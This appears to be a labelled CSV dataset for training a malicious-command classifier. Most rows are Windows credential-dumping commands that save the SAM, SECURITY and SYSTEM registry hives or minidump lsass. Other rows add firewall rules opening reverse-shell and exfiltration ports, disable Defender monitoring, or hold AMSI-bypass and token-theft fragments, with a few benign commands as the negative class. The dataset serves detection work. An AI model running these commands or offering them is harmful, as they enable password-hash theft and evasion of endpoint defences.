text,label
"cmd.exe /c ""reg  save  hklm\sam  c:\windows\temp\h86me2xn.save""",1
"cmd.exe /c ""reg export hklm\security c:\temp\j22duopd.dat""",1
reg save hklm\security c:\windows\temp\jz9c8isy.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\qqmxx780.dat""",1
"powershell  -nop  -c  ""reg  export  hklm\sam  c:\temp\k2n7c8s8.dat""",1
reg export hklm\system c:\windows\temp\g2s8ksx2.save,1
"[dllimport(""advapi32.dll"")]  extern  bool  impersonateloggedonuser(...)",3
"powershell -nop -c ""reg save hklm\sam c:\temp\kuzhmxsq.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\766gh2m5.dat""",1
reg export hklm\system c:\windows\temp\6ve7a8ui.save,1
reg export hklm\sam c:\windows\temp\tci9e0pv.save,1
reg save hklm\system c:\windows\temp\vdgm4hqf.save,1
reg save hklm\system c:\windows\temp\aymm4gbz.save,1
reg save hklm\system c:\windows\temp\n46qgz31.save,1
"powershell -nop -c ""powershell   -nop   -c   ""reg   export   hklm\sam   c:\temp\20dqtwuz.dat""""",1
reg export hklm\system c:\windows\temp\95s5gp7o.save,1
reg save hklm\security c:\windows\temp\0g0qmxqv.save,1
reg save hklm\system c:\windows\temp\ns3relq8.save,1
"powershell  -nop  -c  ""reg  export  hklm\security  c:\temp\q2tcdrys.dat""",1
reg export hklm\sam c:\windows\temp\bizy4a5b.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\1blt6343.dat""",1
"powershell   -nop   -c   ""reg   save   hklm\sam   c:\temp\aoo5j69q.dat""",1
reg export hklm\sam c:\windows\temp\ceynto57.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\ar59m672.dat""",1
"cmd.exe /c ""reg export hklm\security c:\windows\temp\d56vwqha.save""",1
"cmd.exe /c ""reg export hklm\security c:\temp\oa6jqry4.dat""",1
"powershell  -nop  -c  ""reg  save  hklm\security  c:\temp\wwmse2r9.dat""",1
reg save hklm\system c:\windows\temp\ulov0gln.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\j47zjimq.dat""",1
reg save hklm\system c:\windows\temp\kb8hc69p.save,1
reg save hklm\security c:\windows\temp\31gb9lwt.save,1
"powershell -nop -c ""reg   save   hklm\system   c:\windows\temp\pddhk2x6.save""",1
"cmd.exe /c ""cmd.exe  /c  ""reg  export  hklm\security  c:\temp\thvjc741.dat""""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\9zcsbsy2.dat""",1
"cmd.exe /c ""$a  =  [ref].assembly.gettype('system.management.automation.openprocesstoken')""",3
"cmd.exe /c ""powershell  -nop  -c  ""reg  export  hklm\security  c:\temp\3fso0bx3.dat""""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\c05vdfkr.dat""",1
reg export hklm\sam c:\windows\temp\4lt87lvg.save,1
reg   save   hklm\system   c:\windows\temp\k48owc0r.save,1
reg save hklm\security c:\windows\temp\5fdr2bap.save,1
"powershell -nop -c ""reg  save  hklm\security  c:\windows\temp\zht8p4kv.save""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\fqx51bnu.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\xyvk4okx.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\zrd9865u.dat""",1
reg export hklm\system c:\windows\temp\yo9h0hdh.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\nzl325k4.dat""",1
$a  =  [ref].assembly.gettype('system.management.automation.duplicatetokenex'),3
reg export hklm\security c:\windows\temp\4kes9pyi.save,1
"cmd.exe /c ""powershell -nop -c ""reg export hklm\sam c:\temp\xvcrhus7.dat""""",1
reg save hklm\system c:\windows\temp\77m9erl9.save,1
reg save hklm\sam c:\windows\temp\dg3s7t09.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\q34kurx1.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\eivv82sx.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\gofcm3a6.dat""",1
"powershell  -nop  -c  ""reg  export  hklm\security  c:\temp\z6g1zbui.dat""",1
reg save hklm\sam c:\windows\temp\kg8srpbq.save,1
"cmd.exe  /c  ""reg  export  hklm\sam  c:\temp\71p8rkod.dat""",1
reg save hklm\sam c:\windows\temp\cflqa89k.save,1
reg export hklm\sam c:\windows\temp\fk6lyvxz.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\aesby3v6.dat""",1
"powershell -nop -c ""rule:   reverse   shell   |   app:   any   |   dir:   outbound   |   act:   allow   |   port:   1337""",2
"cmd.exe  /c  ""reg  export  hklm\security  c:\temp\kewybe9r.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\0ygtuxor.dat""",1
reg save hklm\security c:\windows\temp\j0x42mpo.save,1
reg export hklm\sam c:\windows\temp\ncwscz41.save,1
reg save hklm\system c:\windows\temp\byocpfvl.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\6c9624nu.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\9234ioeq.dat""",1
reg save hklm\sam c:\windows\temp\zun27ev0.save,1
reg export hklm\security c:\windows\temp\yxjsghq2.save,1
reg export hklm\system c:\windows\temp\8yajessj.save,1
reg save hklm\security c:\windows\temp\vw9r9jqq.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\peymh23m.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\mpcw93s7.dat""",1
reg save hklm\sam c:\windows\temp\j3b3rh1r.save,1
reg export hklm\sam c:\windows\temp\e5z8gjkw.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\f59xuce3.dat""",1
"powershell -nop -c ""sc  query  windefend""",0
reg export hklm\system c:\windows\temp\97nw5umi.save,1
reg export hklm\security c:\windows\temp\o3bc182z.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\nonvmplp.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\oblb9gci.dat""",1
reg export hklm\system c:\windows\temp\bpmyxyny.save,1
"cmd.exe /c ""backup-utility  write  hklm\software  to  c:\backups\config.dat""",0
reg save hklm\sam c:\windows\temp\9yygg3l7.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\tfoauna5.dat""",1
"powershell  -nop  -c  ""reg  export  hklm\sam  c:\temp\1durpsez.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\7qqzeomq.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\us34f8p3.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\i75k9biw.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\ha02kcuk.dat""",1
"cmd.exe /c ""powershell   -nop   -c   ""reg   export   hklm\security   c:\temp\u1g5h40q.dat""""",1
reg export hklm\system c:\windows\temp\zxfa7mvm.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\oxhjvgtu.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\1zs7ghn7.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\66trzn0i.dat""",1
rule: c2 beacon | app: any | dir: outbound | act: allow | port: 1337,2
reg  export  hklm\sam  c:\windows\temp\nalss08u.save,1
reg save hklm\sam c:\windows\temp\uuo0gl3b.save,1
"powershell -nop -c ""rule:  reverse  shell  |  app:  any  |  dir:  outbound  |  act:  allow  |  port:  4444""",2
reg save hklm\security c:\windows\temp\ikq0xxeb.save,1
reg export hklm\system c:\windows\temp\5yzh40yz.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\5qqkmvcv.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\8w3b4cfv.dat""",1
reg   export   hklm\security   c:\windows\temp\syr9wgc3.save,1
reg save hklm\sam c:\windows\temp\xvfh7npd.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\w2b5mhnb.dat""",1
"cmd.exe /c ""powershell   -nop   -c   ""reg   save   hklm\security   c:\temp\yqsg6ayd.dat""""",1
reg save hklm\system c:\windows\temp\y8zmlv1k.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\qwve6hpp.dat""",1
reg export hklm\security c:\windows\temp\klyqgm4w.save,1
reg save hklm\sam c:\windows\temp\yowq69x8.save,1
reg save hklm\sam c:\windows\temp\pa8d1uoy.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\0v6sacpt.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\9o54v9ki.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\dbbi1hdc.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\windows\temp\z95nthj7.save""",1
"cmd.exe   /c   ""reg   export   hklm\security   c:\temp\0nwyi3km.dat""",1
"powershell -nop -c ""reg  save  hklm\sam  c:\windows\temp\9v1bai5u.save""",1
"cmd.exe /c ""cmd.exe /c ""reg save hklm\sam c:\temp\4vlh9gfj.dat""""",1
"cmd.exe /c ""powershell   -nop   -c   ""reg   export   hklm\sam   c:\temp\09n3ap16.dat""""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\2ka9raop.dat""",1
reg export hklm\security c:\windows\temp\0i982avg.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\ds3k3imz.dat""",1
"powershell -nop -c ""rule:  reverse  shell  |  app:  any  |  dir:  outbound  |  act:  allow  |  port:  tcp  8888""",2
reg save hklm\system c:\windows\temp\01vajk8g.save,1
reg export hklm\system c:\windows\temp\e253hwzq.save,1
"cmd.exe /c ""node server.js --port 3000""",0
"powershell -nop -c ""sc query windefend""",0
reg save hklm\system c:\windows\temp\aqblg3vy.save,1
reg export hklm\sam c:\windows\temp\sgmzhhme.save,1
reg  export  hklm\security  c:\windows\temp\hhcz1u9w.save,1
reg export hklm\sam c:\windows\temp\mfai2jez.save,1
rule:  exfil  data  |  app:  c:\users\public\malware.exe  |  dir:  outbound  |  act:  allow  |  port:  4444,2
reg export hklm\sam c:\windows\temp\sp63u26x.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\j9c546ln.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\rxs70icd.dat""",1
reg export hklm\sam c:\windows\temp\r9k30t6a.save,1
reg save hklm\system c:\windows\temp\7qdywpxa.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\hm7j6sd7.dat""",1
token::elevate,3
reg  save  hklm\sam  c:\windows\temp\2ipwx65e.save,1
"powershell -nop -c ""[dllimport(""advapi32.dll"")]  extern  bool  amsiutils(...)""",3
"cmd.exe /c ""netsh   dump   >   netconfig.txt""",0
reg  export  hklm\system  c:\windows\temp\hlqj4kb2.save,1
reg save hklm\sam c:\windows\temp\kj4wpylt.save,1
reg save hklm\security c:\windows\temp\p8nqex1l.save,1
reg export hklm\system c:\windows\temp\bkwmiael.save,1
reg export hklm\system c:\windows\temp\aem9tlue.save,1
"powershell   -nop   -c   ""reg   save   hklm\sam   c:\temp\2vyllm2v.dat""",1
reg export hklm\system c:\windows\temp\r0r1uunb.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\i4y1qtgr.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\5i3for97.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\a4gzr1k9.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\vna7sx4n.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\2s10aup7.dat""",1
reg export hklm\security c:\windows\temp\135b3y6t.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\ympf3bxz.dat""",1
"powershell   -nop   -c   ""reg   export   hklm\security   c:\temp\chzks3et.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\7rnaucyg.dat""",1
rule:  exfil  data  |  app:  any  |  dir:  outbound  |  act:  allow  |  port:  4444,2
"cmd.exe /c ""reg save hklm\security c:\temp\p9u1cs7z.dat""",1
reg export hklm\system c:\windows\temp\cm1bru55.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\23bxfp6i.dat""",1
reg   save   hklm\security   c:\windows\temp\x1nheev9.save,1
reg export hklm\sam c:\windows\temp\b10qclod.save,1
"powershell -nop -c ""rundll32.exe  c:\windows\system32\comsvcs.dll,  minidump  1234  c:\temp\lsass.dmp  full""",1
"cmd.exe /c ""reg  export  hklm\sam  c:\windows\temp\6v564ij5.save""",1
reg export hklm\security c:\windows\temp\ac8wi5f4.save,1
reg save hklm\security c:\windows\temp\znb8jah1.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\p7or0wim.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\9axj0lrd.dat""",1
reg export hklm\sam c:\windows\temp\nyw3r4o3.save,1
reg save hklm\sam c:\windows\temp\xnz6i1ah.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\nzjncgvj.dat""",1
reg export hklm\security c:\windows\temp\5ibtw5t4.save,1
reg export hklm\sam c:\windows\temp\1boc1z2j.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\8ap5gfko.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\eb1et9qo.dat""",1
reg export hklm\sam c:\windows\temp\305oq58w.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\zkgmlcge.dat""",1
reg save hklm\sam c:\windows\temp\h7fugqqe.save,1
reg save hklm\sam c:\windows\temp\8get9b8i.save,1
reg save hklm\system c:\windows\temp\jwre81e0.save,1
"powershell -nop -c ""[dllimport(""advapi32.dll"")] extern bool amsiutils(...)""",3
rule:   exfil   data   |   app:   c:\windows\temp\nc.exe   |   dir:   outbound   |   act:   allow   |   port:   1337,2
reg export hklm\system c:\windows\temp\0ta5mgnf.save,1
reg export hklm\system c:\windows\temp\ri7s7kcq.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\bzwuwwvh.dat""",1
reg export hklm\system c:\windows\temp\563fjqa6.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\42o4ogh6.dat""",1
"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
reg save hklm\security c:\windows\temp\lzb3ael8.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\jzktsclp.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\py1exj8v.dat""",1
reg export hklm\sam c:\windows\temp\lm34tx83.save,1
reg export hklm\system c:\windows\temp\kt94w75k.save,1
reg  save  hklm\sam  c:\windows\temp\zue50rvl.save,1
reg export hklm\security c:\windows\temp\acgf5sic.save,1
"cmd.exe /c ""powershell  -nop  -c  ""reg  save  hklm\sam  c:\temp\csxg1hgo.dat""""",1
"powershell -nop -c ""cmd.exe /c ""reg export hklm\security c:\temp\bh7e9vpv.dat""""",1
"cmd.exe /c ""rule: reverse shell | app: any | dir: outbound | act: allow | port: tcp 8888""",2
"cmd.exe /c ""reg   save   hklm\system   c:\windows\temp\v5ok73zd.save""",1
"cmd.exe /c ""python   -m   http.server   8080""",0
"cmd.exe /c ""set-mppreference   -disablerealtimemonitoring   $true""",2
"cmd.exe /c ""reg export hklm\security c:\temp\f2b855nk.dat""",1
reg export hklm\system c:\windows\temp\9ahqyf2r.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\53rxy7wb.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\kyrdh31b.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\uspsrtq4.dat""",1
reg save hklm\sam c:\windows\temp\lg08tpub.save,1
"cmd.exe /c ""reg save hklm\system c:\windows\temp\20dj7dbp.save""",1
"cmd.exe /c ""[dllimport(""advapi32.dll"")]   extern   bool   duplicatetokenex(...)""",3
reg save hklm\sam c:\windows\temp\8d2zseur.save,1
"cmd.exe /c ""reg export hklm\security c:\windows\temp\mhpbsg5z.save""",1
reg save hklm\sam c:\windows\temp\wxuoznh4.save,1
"powershell -nop -c ""reg  save  hklm\sam  c:\windows\temp\nliaqa0m.save""",1
reg export hklm\system c:\windows\temp\ws61uajt.save,1
reg save hklm\system c:\windows\temp\b3fd88s9.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\8mdow7es.dat""",1
"cmd.exe /c ""rule: exfil data | app: c:\windows\temp\nc.exe | dir: outbound | act: allow | port: tcp 8888""",2
"powershell -nop -c ""reg export hklm\security c:\temp\4dbomler.dat""",1
reg export hklm\system c:\windows\temp\i29ap67i.save,1
"cmd.exe /c ""reg   save   hklm\system   c:\windows\temp\vtyrs6xn.save""",1
"cmd.exe /c ""reg save hklm\security c:\temp\iinxu1r7.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\4tkb1rfr.dat""",1
reg export hklm\system c:\windows\temp\98u8hvgs.save,1
"powershell -nop -c ""reg save hklm\system c:\windows\temp\zfpvs3uj.save""",1
whoami  /groups,0
reg   save   hklm\sam   c:\windows\temp\9wxl0uhs.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\3sbj64v1.dat""",1
reg save hklm\security c:\windows\temp\ualvdc43.save,1
"powershell -nop -c ""netsh  advfirewall  firewall  add  rule  name=""bad""  action=allow  protocol=any  port=4444""",2
reg save hklm\security c:\windows\temp\josgwe0k.save,1
reg save hklm\security c:\windows\temp\40moglsz.save,1
reg export hklm\security c:\windows\temp\0m4dbi8q.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\wj7mr1q3.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\cf0m2u8f.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\d92a4epp.dat""",1
reg   save   hklm\sam   c:\windows\temp\hv1mg7sz.save,1
reg save hklm\security c:\windows\temp\tkx02jkr.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\9sxovdzp.dat""",1
"cmd.exe /c ""select-string -path c:\logs\app.log -pattern 'failed logon'""",0
reg export hklm\security c:\windows\temp\yf77f76v.save,1
"cmd.exe  /c  ""reg  export  hklm\sam  c:\temp\joy80ie7.dat""",1
"powershell -nop -c ""set-mppreference  -disablerealtimemonitoring  $true""",2
$a   =   [ref].assembly.gettype('system.management.automation.amsiutils'),3
"cmd.exe /c ""[dllimport(""advapi32.dll"")]  extern  bool  amsiutils(...)""",3
reg save hklm\sam c:\windows\temp\gwep5l02.save,1
reg export hklm\system c:\windows\temp\x4vlf6aa.save,1
reg save hklm\system c:\windows\temp\d69nl0g6.save,1
reg save hklm\system c:\windows\temp\rv93nyog.save,1
reg save hklm\security c:\windows\temp\wi4989g8.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\6jtrhuov.dat""",1
